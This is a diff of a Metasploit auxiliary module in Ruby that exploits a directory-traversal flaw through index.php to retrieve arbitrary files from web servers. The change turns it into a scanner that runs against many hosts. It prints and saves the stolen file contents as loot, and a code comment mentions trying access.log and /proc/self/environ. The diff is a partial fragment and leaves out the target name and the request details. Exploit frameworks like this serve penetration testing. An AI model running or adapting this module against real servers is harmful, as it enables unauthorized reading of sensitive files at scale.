@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
@@ -41,13 +42,13 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
-  def run
+  def run_host(ip)
     uri = target_uri.path
     uri << '/' if uri[-1, 1] != '/'
 
     t = "/.." * datastore['DEPTH']
 
-    print_status("Retrieving #{datastore['FILE']}")
+    vprint_status("#{peer} - Retrieving #{datastore['FILE']}")
 
     # No permission to access.log or proc/self/environ, so this is all we do :-/
     uri = normalize_uri(uri, 'index.php')
@@ -57,13 +58,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if not res
-      print_error("Server timed out")
+      vprint_error("#{peer} - Server timed out")
     elsif res and res.body =~ /Error 404 requested page cannot be found/
-      print_error("Either the file doesn't exist, or you don't have the permission to get it")
+      vprint_error("#{peer} - Either the file doesn't exist, or you don't have the permission to get it")
     else
       # We don't save the body by default, because there's also other junk in it.
       # But we still have a SAVE option just in case
-      print_line(res.body)
+      print_good("#{peer} - #{datastore['FILE']} retrieved")
+      vprint_line(res.body)
 
       if datastore['SAVE']
         p = store_loot(
@@ -73,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
           res.body,
           ::File.basename(datastore['FILE'])
         )
-        print_status("File saved as: #{p}")
+        print_good("#{peer} - File saved as: #{p}")
       end
     end
   end
